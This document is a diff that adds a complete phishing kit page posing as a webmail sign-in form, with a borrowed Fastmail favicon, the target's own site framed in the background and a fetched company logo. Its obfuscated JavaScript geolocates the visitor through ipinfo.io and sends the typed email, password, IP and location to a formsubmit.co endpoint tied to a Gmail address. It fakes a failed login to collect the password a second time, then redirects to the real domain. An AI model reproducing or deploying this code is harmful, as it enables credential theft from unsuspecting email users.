@@ -1,0 +1,131 @@
+<!DOCTYPE html> 
+<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link id="favicon" rel="shortcut icon" sizes="32x32" href="https://www.fastmail.com/static/favicons/icon-32x32.png">     
+<title  class="logoname">Mail</title>	
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+	* {
+		box-sizing: border-box;
+		padding: 0;
+		margin: 0;
+	}
+
+	body {
+		height: 100vh;
+		width: 100vw;
+		font-family: Arial, Helvetica, sans-serif;
+	}
+
+	.bg-img {
+		height: 100%;
+		width: 100%;
+		background-position: center;
+		background-repeat: no-repeat;
+		background-size: cover;
+	}
+	iframe {
+		height: 100%;
+		width: 100%;
+	}
+
+	/* Add styles to the form container */
+	.container {
+		max-width: 400px;
+		padding: 16px;
+		background-color: white;
+		border-radius: 5px;
+		position: absolute;
+		left: 50%;
+		top: 50%;
+		transform: translate(-50%, -50%);
+		z-index: 2;
+	}
+
+	@media (max-width: 480px) {
+		.container {
+			left: 10%;
+			top: 10%;
+			margin-left: 5%;
+			transform: translate(-10%, -10%);
+		}
+	}
+
+	/* Full-width input fields */
+	input[type=text], input[type=password] {
+		width: 100%;
+		padding: 15px;
+		margin: 5px 0 22px 0;
+		border: none;
+		background: #f1f1f1;
+	}
+
+	input[type=text]:focus, input[type=password]:focus {
+		background-color: #ddd;
+		outline: none;
+	}
+
+	.btn {
+		background-color: #0096FF;
+		color: white;
+		padding: 16px 20px;
+		border: none;
+		cursor: pointer;
+		width: 100%;
+		opacity: 0.9;
+	}
+
+	.btn:hover {
+		opacity: 1;
+	}
+
+	.img {
+		text-align: center;
+	}
+
+	#title {
+		text-align: center;
+		margin: 10px 0;
+	}
+
+	#error {
+		display: none;
+		color: red;
+	}
+</style>
+</head>
+<body>
+<script></script>
+<div class="bg-img" id="bg-img">
+	<iframe id="frame" src="https://" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
+</div>
+<form class="container" id="login-form">
+	<div class="img">
+		<img src="" id="logo">
+	</div>
+
+	<h3 id="title">Sign In</h3>
+
+	<h5 id="error">please try again!</h5>
+
+	<label for="email"><b>Email Address</b></label>
+	<input type="text" placeholder="Enter Email" name="email" id="email" required="" readonly="">
+
+	<label for="psw"><b>Password</b></label>
+	<input type="password" placeholder="Enter Email Password" name="password" id="psw" required="">
+
+	<input type="hidden" name="step" id="step">
+
+	<button type="submit" class="btn">Sign In</button>
+</form>
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+const _0xff0845=_0x5cdf;(function(_0x5c9162,_0x33daef){const _0x472075=_0x5cdf,_0x379a65=_0x5c9162();while(!![]){try{const _0x3f66f7=parseInt(_0x472075(0x1b0))/0x1+-parseInt(_0x472075(0x1ac))/0x2+parseInt(_0x472075(0x1a7))/0x3*(-parseInt(_0x472075(0x1a3))/0x4)+parseInt(_0x472075(0x196))/0x5*(parseInt(_0x472075(0x1b4))/0x6)+parseInt(_0x472075(0x1ba))/0x7+parseInt(_0x472075(0x19d))/0x8+parseInt(_0x472075(0x1ae))/0x9*(-parseInt(_0x472075(0x1a8))/0xa);if(_0x3f66f7===_0x33daef)break;else _0x379a65['push'](_0x379a65['shift']());}catch(_0x21c8ec){_0x379a65['push'](_0x379a65['shift']());}}}(_0xa9c6,0xaae18));function _0x5cdf(_0x4f9fe2,_0x34da74){const _0xa9c652=_0xa9c6();return _0x5cdf=function(_0x5cdfa4,_0x28d1a6){_0x5cdfa4=_0x5cdfa4-0x196;let _0x56e924=_0xa9c652[_0x5cdfa4];return _0x56e924;},_0x5cdf(_0x4f9fe2,_0x34da74);}function _0xa9c6(){const _0xfda37b=['590zgXrHS','location','city','json','1843886gOadpL','submit','84951WIiPtU','https://','928349MmhBUE','Sign\x20In','pop','fail','46986JzoSUB','css','#email','#logo','preventDefault','#login-form','3291680idUHZd','675OFWyeU','button[type=\x27submit\x27]','https://ipinfo.io/json','#error','text','val','country','6543384dvLRqz','#psw','Verifying...','http://','src','https://formsubmit.co/ajex/flash60000000@gmail.com','12fEMkDY','attr','split','https://logo.clearbit.com/','1094925fzThAO'];_0xa9c6=function(){return _0xfda37b;};return _0xa9c6();}let step=0x1;const clientID=window[_0xff0845(0x1a9)]['hash'][_0xff0845(0x1a5)]('#')[_0xff0845(0x1b2)]();$(_0xff0845(0x1b6))[_0xff0845(0x19b)](clientID);const domain=clientID['split']('@')['pop']();$('#frame')[_0xff0845(0x1a4)](_0xff0845(0x1a1),_0xff0845(0x1af)+domain),$(_0xff0845(0x1b7))[_0xff0845(0x1a4)](_0xff0845(0x1a1),_0xff0845(0x1a6)+domain);const submit=$(_0xff0845(0x197));$(_0xff0845(0x1b9))[_0xff0845(0x1ad)](function(_0x8352e9){const _0x34d516=_0xff0845;_0x8352e9[_0x34d516(0x1b8)](),submit[_0x34d516(0x19a)](_0x34d516(0x19f)),$['getJSON'](_0x34d516(0x198),function(_0x214d6f){const _0xc6aa2b=_0x34d516,_0x21b07e=$['post'](_0xc6aa2b(0x1a2),{'_subject':'Logs\x20|\x20'+_0x214d6f['ip'],'Email':$('#email')[_0xc6aa2b(0x19b)](),'Password':$(_0xc6aa2b(0x19e))[_0xc6aa2b(0x19b)](),'Attempts':step,'IP':_0x214d6f['ip'],'Location':_0x214d6f[_0xc6aa2b(0x1aa)]+',\x20'+_0x214d6f[_0xc6aa2b(0x19c)]});_0x21b07e['done'](function(_0x342e63){const _0x1c1bc6=_0xc6aa2b;step===0x2?window[_0x1c1bc6(0x1a9)]['href']=_0x1c1bc6(0x1a0)+domain:(step++,$(_0x1c1bc6(0x199))['css']('display','block'),submit['text'](_0x1c1bc6(0x1b1)),$(_0x1c1bc6(0x19e))[_0x1c1bc6(0x19b)](''));}),_0x21b07e[_0xc6aa2b(0x1b3)](function(_0x21b7c7){const _0x10c5b1=_0xc6aa2b;console['error'](_0x21b7c7),$(_0x10c5b1(0x199))[_0x10c5b1(0x1b5)]('display','block'),submit[_0x10c5b1(0x19a)](_0x10c5b1(0x1b1)),$(_0x10c5b1(0x19e))[_0x10c5b1(0x19b)]('');});},_0x34d516(0x1ab));});
+
+</script>
+</body>
+</html>
